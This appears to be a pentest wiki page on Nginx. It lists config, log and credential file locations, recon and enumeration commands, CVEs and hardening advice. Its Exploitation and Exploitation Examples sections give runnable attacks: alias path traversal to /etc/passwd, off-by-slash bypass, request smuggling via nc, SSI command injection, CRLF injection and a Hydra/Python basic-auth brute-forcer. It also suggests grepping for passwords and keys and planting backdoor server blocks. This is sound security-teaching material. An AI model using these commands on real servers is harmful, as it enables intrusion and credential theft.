# Nginx

!!! info "Information"
    **Category:** Web Server  
    **Tags:** 'web-server' 'reverse-proxy' 'load-balancer' 'http' 'https'  
    **Criticality:** 🔴 High

## Description

Nginx (pronounced "engine-x") is a high-performance web server, reverse proxy server, and load balancer. Initially released in 2004 by Igor Sysoev, Nginx is known for its stability, rich feature set, simple configuration, and low resource consumption. It handles concurrent connections efficiently using an event-driven, asynchronous architecture rather than traditional thread-based models.

Nginx powers approximately 33.8% of all websites globally and is used by high-traffic sites such as Netflix, WordPress.com, GitHub, and Cloudflare. It supports HTTP/1.1, HTTP/2, HTTP/3, WebSocket, SSL/TLS, and can function as a mail proxy (IMAP/POP3/SMTP).

Common use cases include serving static content, reverse proxying to application servers, load balancing, SSL/TLS termination, caching, and media streaming.

---

## Configuration Files

=== "Linux (Debian/Ubuntu)"
    ```bash
    # Main configuration
    /etc/nginx/nginx.conf
    
    # Site-specific configurations
    /etc/nginx/sites-available/
    /etc/nginx/sites-enabled/
    
    # Additional module configurations
    /etc/nginx/conf.d/
    
    # Snippets and includes
    /etc/nginx/snippets/
    ```

=== "Linux (RedHat/CentOS)"
    ```bash
    # Main configuration
    /etc/nginx/nginx.conf
    
    # Additional configurations
    /etc/nginx/conf.d/
    
    # Virtual host configurations
    /etc/nginx/vhosts.d/
    ```

=== "Windows"
    ```powershell
    # Standard installation
    C:\nginx\conf\nginx.conf
    
    # Additional configs
    C:\nginx\conf\conf.d\
    ```

=== "macOS"
    ```bash
    # System installation
    /etc/nginx/nginx.conf
    
    # Homebrew (Intel)
    /usr/local/etc/nginx/nginx.conf
    /usr/local/etc/nginx/servers/
    
    # Homebrew (Apple Silicon)
    /opt/homebrew/etc/nginx/nginx.conf
    /opt/homebrew/etc/nginx/servers/
    ```

---

## Log Files

```bash
# Debian/Ubuntu
/var/log/nginx/access.log
/var/log/nginx/error.log

# RedHat/CentOS
/var/log/nginx/access.log
/var/log/nginx/error.log

# Windows
C:\nginx\logs\access.log
C:\nginx\logs\error.log

# macOS (Homebrew)
/usr/local/var/log/nginx/access.log
/usr/local/var/log/nginx/error.log
/opt/homebrew/var/log/nginx/access.log
/opt/homebrew/var/log/nginx/error.log

# Custom installations
/usr/local/nginx/logs/access.log
/usr/local/nginx/logs/error.log
```

---

## Sensitive Files

!!! danger "Credentials and sensitive data"
    The following files may contain critical information:
    
    - `nginx.conf` - Main configuration file with server blocks, SSL settings, authentication
    - `.htpasswd` - HTTP basic authentication credentials (typically in /etc/nginx/.htpasswd)
    - `ssl_certificate` - SSL/TLS certificate files
    - `ssl_certificate_key` - Private keys for SSL/TLS
    - `fastcgi_params` - FastCGI configuration with potential sensitive parameters
    - `uwsgi_params` - uWSGI configuration parameters
    - `proxy_params` - Reverse proxy configuration
    - `*.pem` - Certificate and key files in PEM format

!!! warning "Backup files"
    Don't forget to check for backups:
    
    - `nginx.conf~`
    - `nginx.conf.bak`
    - `nginx.conf.old`
    - `nginx.conf.backup`
    - `nginx.conf.save`
    - `*.conf.swp` (vim swap files)
    - `default~`, `default.bak`

---

## Data Directories

```bash
# Debian/Ubuntu - Web root
/var/www/html/
/var/www/

# RedHat/CentOS - Web root
/usr/share/nginx/html/

# Cache directories
/var/cache/nginx/

# Runtime data
/var/run/nginx/
/run/nginx/

# Windows
C:\nginx\html\
C:\inetpub\wwwroot\

# macOS
/usr/local/var/www/
/opt/homebrew/var/www/
```

---

## Pentest Tips

!!! tip "Reconnaissance"
    **Version identification:**
    ```bash
    # Banner grabbing with curl
    curl -I http://target.com
    
    # Banner grabbing with nc
    echo -e "HEAD / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
    
    # Nmap service detection
    nmap -p 80,443 -sV target.com
    
    # Detailed Nmap scan
    nmap -p 80,443 -A target.com
    ```
    
    **Default ports:**
    - HTTP: 80
    - HTTPS: 443
    - Alternative ports: 8080, 8443, 8888
    
    **SSL/TLS enumeration:**
    ```bash
    # Certificate inspection
    openssl s_client -connect target.com:443 -showcerts
    
    # SSL/TLS cipher enumeration
    nmap -p 443 --script ssl-enum-ciphers target.com
    
    # Comprehensive SSL test
    ./testssl.sh target.com:443
    ```

!!! tip "Enumeration"
    **Common misconfigurations to check:**
    
    - Server version disclosure (`Server: nginx/1.18.0`)
    - Directory listing enabled (autoindex on)
    - Exposed configuration files (`/nginx.conf`, `/nginx.conf.bak`)
    - Backup files in web root
    - Debug/status pages (`/nginx_status`, `/stub_status`)
    - Default error pages revealing information
    
    **Directory brute-forcing:**
    ```bash
    # Gobuster
    gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
    
    # Feroxbuster (recursive)
    feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/common.txt
    
    # Dirsearch
    dirsearch -u http://target.com -e php,html,js
    
    # ffuf
    ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
    ```
    
    **Virtual host enumeration:**
    ```bash
    # ffuf for vhost discovery
    ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
         -u http://target.com/ -H "Host: FUZZ.target.com"
    
    # Gobuster vhost mode
    gobuster vhost -u http://target.com \
                   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
    ```
    
    **HTTP method enumeration:**
    ```bash
    # Using curl
    curl -X OPTIONS http://target.com -v
    
    # Using Nmap
    nmap -p 80 --script http-methods target.com
    
    # Test dangerous methods
    curl -X PUT -d "test" http://target.com/test.txt
    curl -X DELETE http://target.com/test.txt
    curl -X TRACE http://target.com
    ```
    
    **Check common files:**
    ```bash
    # robots.txt and sitemap
    curl http://target.com/robots.txt
    curl http://target.com/sitemap.xml
    
    # Configuration files
    curl http://target.com/.htaccess
    curl http://target.com/web.config
    curl http://target.com/.git/config
    ```

!!! tip "Exploitation"
    **Path traversal via misconfigured alias/root:**
    ```bash
    # If root directive applies globally without proper location blocks
    GET /nginx.conf HTTP/1.1
    Host: target.com
    
    # Alias misconfiguration
    # If location /imgs aliases to /var/www/imgs (missing trailing slash)
    GET /imgs../etc/passwd HTTP/1.1
    ```
    
    **Off-by-slash vulnerability:**
    ```bash
    # Exploiting misconfigured location blocks
    # If proxy_pass has trailing slash but location doesn't
    GET /api../admin HTTP/1.1
    ```
    
    **HTTP request smuggling:**
    ```bash
    # CL.TE smuggling
    POST / HTTP/1.1
    Host: target.com
    Content-Length: 6
    Transfer-Encoding: chunked
    
    0
    
    G
    ```
    
    **CRLF injection in headers:**
    ```bash
    # Attempt header injection
    curl "http://target.com/" -H $'X-Header: test\r\nSet-Cookie: admin=true'
    ```
    
    **Server-Side Includes (SSI) injection:**
    ```bash
    # If SSI is enabled
    <!--#exec cmd="id" -->
    <!--#include virtual="/etc/passwd" -->
    ```

!!! tip "Post-Exploitation"
    **Where to find credentials:**
    
    - HTTP basic auth: `/etc/nginx/.htpasswd`
    - FastCGI credentials: Check `fastcgi_param` directives in configs
    - Proxy credentials: Look for `proxy_set_header Authorization` directives
    - Database connection strings in application configs served by Nginx
    - SSL private keys: Usually referenced in `ssl_certificate_key` directive
    
    **Configuration analysis:**
    ```bash
    # Find all Nginx configuration files
    find /etc/nginx -type f -name "*.conf" 2>/dev/null
    find / -name "nginx.conf" 2>/dev/null
    
    # Search for passwords in configs
    grep -r "password" /etc/nginx/ 2>/dev/null
    grep -r "auth" /etc/nginx/ 2>/dev/null
    
    # Find SSL keys and certificates
    grep -r "ssl_certificate" /etc/nginx/ 2>/dev/null
    ```
    
    **Persistence mechanisms:**
    
    - Add malicious server block for backdoor
    - Modify existing location blocks to serve malicious content
    - Inject reverse shell in error pages
    - Leverage Nginx as a pivot point for internal network access

---

## Useful Commands

```bash
# Check if Nginx is running
systemctl status nginx
ps aux | grep nginx

# Test configuration syntax
nginx -t
nginx -T  # Show full configuration

# Verify configuration file location
nginx -V 2>&1 | grep -o '\-\-conf-path=\S*'

# Show version and compile-time options
nginx -V

# Start/Stop/Restart Nginx
systemctl start nginx
systemctl stop nginx
systemctl restart nginx

# Reload configuration without dropping connections
systemctl reload nginx
nginx -s reload

# Stop gracefully
nginx -s quit

# Stop immediately
nginx -s stop

# Reopen log files (useful after log rotation)
nginx -s reopen

# Locate configuration files
find /etc -name "nginx.conf" 2>/dev/null
locate nginx.conf

# Search for credentials in configs
grep -r "auth_basic_user_file" /etc/nginx/ 2>/dev/null
grep -r "password" /etc/nginx/ 2>/dev/null

# Monitor logs in real-time
tail -f /var/log/nginx/access.log
tail -f /var/log/nginx/error.log

# Filter error log for specific severity
grep -i "error\|crit\|alert\|emerg" /var/log/nginx/error.log

# List enabled sites (Debian/Ubuntu)
ls -la /etc/nginx/sites-enabled/

# Check listening ports
netstat -tlnp | grep nginx
ss -tlnp | grep nginx

# Count requests by status code
awk '{print $9}' /var/log/nginx/access.log | sort | uniq -c | sort -rn

# Find most accessed URLs
awk '{print $7}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20

# Find requests from specific IP
grep "192.168.1.100" /var/log/nginx/access.log
```

---

## Known Vulnerabilities

??? danger "CVE-2025-53859 - Buffer overread in ngx_mail_smtp_module"
    Buffer overread vulnerability in the SMTP authentication process of the mail module.
    
    **Affected versions:** 0.7.22-1.29.0  
    **Severity:** Low  
    **Fixed in:** 1.29.1+  
    **Impact:** Sensitive information disclosure via SMTP authentication memory over-read

??? danger "CVE-2025-23419 - SSL session reuse vulnerability"
    SSL session reuse vulnerability allowing potential session hijacking.
    
    **Affected versions:** 1.11.4-1.27.3  
    **Severity:** Medium  
    **Fixed in:** 1.27.4+, 1.26.3+

??? danger "CVE-2025-1974 - Kubernetes ingress-nginx RCE (IngressNightmare)"
    Remote Code Execution vulnerability in Ingress NGINX Controller for Kubernetes via configuration injection in the Validating Admission Controller.
    
    **Affected versions:** Multiple versions of ingress-nginx  
    **Severity:** Critical (CVSS 9.8)  
    **Fixed in:** ingress-nginx v1.12.1, v1.11.5  
    **Impact:** Allows attackers to execute arbitrary code and access all cluster secrets across namespaces, leading to complete cluster takeover
    
    **Exploitation:**
    ```bash
    # Attackers can inject malicious NGINX configurations
    # by sending crafted ingress objects to the admission controller
    # This is particularly dangerous in multi-tenant environments
    ```

??? danger "CVE-2024-7347 - Buffer overread in ngx_http_mp4_module"
    Buffer overread vulnerability in the MP4 module.
    
    **Affected versions:** 1.5.13-1.27.0  
    **Severity:** Low  
    **Fixed in:** 1.27.1+, 1.26.2+

??? danger "CVE-2024-32760 - Buffer overwrite in HTTP/3"
    Buffer overwrite vulnerability in HTTP/3 implementation.
    
    **Affected versions:** 1.25.0-1.25.5, 1.26.0  
    **Severity:** Medium  
    **Fixed in:** 1.27.0+, 1.26.1+

??? danger "CVE-2024-31079 - Stack overflow and use-after-free in HTTP/3"
    Stack overflow and use-after-free vulnerabilities in HTTP/3.
    
    **Affected versions:** 1.25.0-1.25.5, 1.26.0  
    **Severity:** Medium  
    **Fixed in:** 1.27.0+, 1.26.1+

??? danger "CVE-2024-35200 - NULL pointer dereference in HTTP/3"
    NULL pointer dereference in HTTP/3 implementation.
    
    **Affected versions:** 1.25.0-1.25.5, 1.26.0  
    **Severity:** Medium  
    **Fixed in:** 1.27.0+, 1.26.1+

??? danger "CVE-2024-34161 - Memory disclosure in HTTP/3"
    Memory disclosure vulnerability in HTTP/3.
    
    **Affected versions:** 1.25.0-1.25.5, 1.26.0  
    **Severity:** Medium  
    **Fixed in:** 1.27.0+, 1.26.1+

??? danger "CVE-2022-41741 - Memory corruption in ngx_http_mp4_module"
    Memory corruption vulnerability in the MP4 module.
    
    **Affected versions:** 1.1.3-1.23.1, 1.0.7-1.0.15  
    **Severity:** Medium  
    **Fixed in:** 1.23.2+, 1.22.1+

??? danger "CVE-2021-23017 - 1-byte memory overwrite in resolver"
    A 1-byte memory overwrite vulnerability in the resolver component.
    
    **Affected versions:** 0.6.18-1.20.0  
    **Severity:** Medium  
    **Fixed in:** 1.21.0+, 1.20.1+  
    
    **Exploitation:**
    ```bash
    # Exploitation requires DNS resolver to be enabled
    # Attack can be performed via malicious DNS responses
    ```

??? danger "CVE-2019-9511 - HTTP/2 Rapid Reset (Excessive CPU usage)"
    Excessive CPU usage vulnerability in HTTP/2 with small window updates.
    
    **Affected versions:** 1.9.5-1.17.2  
    **Severity:** Medium  
    **Fixed in:** 1.17.3+, 1.16.1+  
    
    **Exploitation:**
    ```bash
    # DoS attack exploiting HTTP/2 specification
    # Rapidly create and cancel streams
    # Configure rate limiting and connection limits
    ```

??? danger "CVE-2017-7529 - Integer overflow in range filter"
    Integer overflow in the range filter module.
    
    **Affected versions:** 0.5.6-1.13.2  
    **Severity:** Medium  
    **Fixed in:** 1.13.3+, 1.12.1+  
    
    **Exploitation:**
    ```bash
    # Send crafted Range header
    GET / HTTP/1.1
    Host: target.com
    Range: bytes=0-18446744073709551615
    ```

??? danger "CVE-2016-4450 - NULL pointer dereference"
    NULL pointer dereference while writing client request body.
    
    **Affected versions:** 1.3.9-1.11.0  
    **Severity:** Medium  
    **Fixed in:** 1.11.1+, 1.10.1+

---

## Hardening

!!! success "Best practices"
    **1. Disable server version disclosure:**
    ```nginx
    http {
        server_tokens off;
    }
    ```
    
    **2. Run Nginx as unprivileged user:**
    ```nginx
    user nginx;
    # or
    user www-data;
    ```
    
    **3. Disable unnecessary HTTP methods:**
    ```nginx
    if ($request_method !~ ^(GET|HEAD|POST)$ ) {
        return 405;
    }
    ```
    
    **4. Implement strong SSL/TLS configuration:**
    ```nginx
    # Use modern TLS versions only
    ssl_protocols TLSv1.2 TLSv1.3;
    
    # Strong cipher suites
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';
    
    # Prefer server ciphers
    ssl_prefer_server_ciphers off;
    
    # DH parameters (generate with: openssl dhparam -out /etc/nginx/dhparam.pem 4096)
    ssl_dhparam /etc/nginx/dhparam.pem;
    
    # Enable OCSP stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    ```
    
    **5. Add security headers:**
    ```nginx
    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    
    # Prevent clickjacking
    add_header X-Frame-Options "SAMEORIGIN" always;
    
    # XSS protection
    add_header X-XSS-Protection "1; mode=block" always;
    
    # Prevent MIME sniffing
    add_header X-Content-Type-Options "nosniff" always;
    
    # Referrer policy
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    # Content Security Policy
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';" always;
    ```
    
    **6. Disable directory listing:**
    ```nginx
    autoindex off;
    ```
    
    **7. Restrict access by IP address:**
    ```nginx
    location /admin {
        allow 192.168.1.0/24;
        deny all;
    }
    ```
    
    **8. Implement rate limiting:**
    ```nginx
    # Define rate limit zone
    limit_req_zone $binary_remote_addr zone=loginlimit:10m rate=1r/s;
    
    # Apply to specific location
    location /login {
        limit_req zone=loginlimit burst=5 nodelay;
    }
    ```
    
    **9. Set proper file permissions:**
    ```bash
    # Configuration files
    chown -R root:root /etc/nginx
    chmod -R 750 /etc/nginx
    chmod 640 /etc/nginx/nginx.conf
    
    # Web content
    chown -R nginx:nginx /var/www/html
    chmod -R 755 /var/www/html
    ```
    
    **10. Hide sensitive files:**
    ```nginx
    # Deny access to hidden files
    location ~ /\. {
        deny all;
        access_log off;
        log_not_found off;
    }
    
    # Deny access to backup files
    location ~* \.(bak|old|backup|save|conf~)$ {
        deny all;
    }
    ```
    
    **11. Enable and monitor logs:**
    ```nginx
    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log warn;
    ```
    
    **12. Implement timeout values:**
    ```nginx
    client_body_timeout 10;
    client_header_timeout 10;
    keepalive_timeout 5 5;
    send_timeout 10;
    ```
    
    **13. Limit buffer sizes:**
    ```nginx
    client_body_buffer_size 1K;
    client_header_buffer_size 1k;
    client_max_body_size 1k;
    large_client_header_buffers 2 1k;
    ```
    
    **14. Disable unused modules (compile-time):**
    ```bash
    ./configure --without-http_autoindex_module \
                --without-http_ssi_module \
                --without-http_userid_module \
                --without-http_geo_module \
                --without-http_split_clients_module
    ```
    
    **15. Implement Web Application Firewall:**
    ```bash
    # Install ModSecurity with OWASP Core Rule Set
    # Or use cloud-based WAF solutions like Cloudflare, Sucuri
    ```
    
    - Keep Nginx regularly updated
    - Use strong authentication for admin areas
    - Enable encryption (SSL/TLS) for all sensitive communications
    - Regularly audit configuration files
    - Monitor logs for suspicious activity
    - Implement automated security scanning
    - Use fail2ban or similar tools to block brute-force attacks
    - Backup configurations regularly

---

## References

- [Official Nginx Documentation](https://nginx.org/en/docs/)
- [Nginx Security Advisories](https://nginx.org/en/security_advisories.html)
- [OWASP Nginx Security Guidelines](https://cheatsheetseries.owasp.org/cheatsheets/Nginx_Configuration_Cheat_Sheet.html)
- [CVE Details - Nginx](https://www.cvedetails.com/product/17956/Nginx-Nginx.html)
- [Nginx Admin Guide](https://docs.nginx.com/nginx/admin-guide/)
- [Mozilla SSL Configuration Generator](https://ssl-config.mozilla.org/)
- [HackerOne - Nginx Bug Bounty](https://hackerone.com/nginx)

---

## Exploitation Examples

??? example "Example 1: Exploiting alias misconfiguration (Path Traversal)"
    ```bash
    # Vulnerable configuration:
    # location /imgs {
    #     alias /var/www/images/;  # Missing trailing slash
    # }
    
    # Exploitation
    curl http://target.com/imgs../etc/passwd
    
    # Expected result: Contents of /etc/passwd
    # This works because /imgs.. resolves to /var/www/images/../ -> /var/www/
    ```

??? example "Example 2: Off-by-slash in proxy_pass"
    ```bash
    # Vulnerable configuration:
    # location /api {
    #     proxy_pass http://backend/;  # Trailing slash present
    # }
    
    # Exploitation - access unauthorized endpoints
    curl http://target.com/api../admin
    
    # Result: Request forwarded to http://backend/../admin
    # Bypassing intended /api restriction
    ```

??? example "Example 3: HTTP request smuggling (CL.TE)"
    ```bash
    # Craft smuggled request
    printf 'POST / HTTP/1.1\r
    Host: target.com\r
    Content-Length: 49\r
    Transfer-Encoding: chunked\r
    \r
    e\r
    q=smuggling&x=\r
    0\r
    \r
    GET /admin HTTP/1.1\r
    X: ' | nc target.com 80
    
    # Expected result: Smuggled GET /admin request processed
    ```

??? example "Example 4: Enumerating allowed HTTP methods"
    ```bash
    # Test for allowed methods
    curl -X OPTIONS http://target.com -v
    
    # Expected output in response headers:
    # Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
    
    # Test dangerous methods
    echo "Test file" > test.txt
    curl -X PUT http://target.com/uploads/test.txt --upload-file test.txt
    
    # If successful, file uploaded without authentication
    ```

??? example "Example 5: Brute-forcing HTTP Basic Authentication"
    ```bash
    # Using Hydra
    hydra -l admin -P /usr/share/wordlists/rockyou.txt \
          target.com http-get /admin
    
    # Using custom Python script
    python3 << EOF
    import requests
    from requests.auth import HTTPBasicAuth
    
    with open('/usr/share/wordlists/rockyou.txt', 'r') as f:
        for password in f:
            password = password.strip()
            r = requests.get('http://target.com/admin', 
                           auth=HTTPBasicAuth('admin', password))
            if r.status_code == 200:
                print(f'[+] Password found: {password}')
                break
    EOF
    ```

??? example "Example 6: Exploiting directory listing (autoindex on)"
    ```bash
    # Check if directory listing is enabled
    curl http://target.com/uploads/
    
    # If autoindex is on, you'll see directory contents
    # Download all files recursively
    wget -r -np -nH --cut-dirs=1 http://target.com/uploads/
    
    # Look for sensitive files
    # config files, database dumps, backups, etc.
    ```

??? example "Example 7: Exploiting exposed Nginx status page"
    ```bash
    # Check for status endpoints
    curl http://target.com/nginx_status
    curl http://target.com/status
    curl http://target.com/stub_status
    
    # Expected output if exposed:
    # Active connections: 291
    # server accepts handled requests
    #  16630948 16630948 31070465
    # Reading: 6 Writing: 179 Waiting: 106
    
    # Information disclosure: connection metrics, server load
    ```

---

## Metadata

- **Template version:** 1.0
- **Last updated:** January 2026
- **Contributor:** Laurince AGANI / Epihack Benin
- **Sources verified:** Yes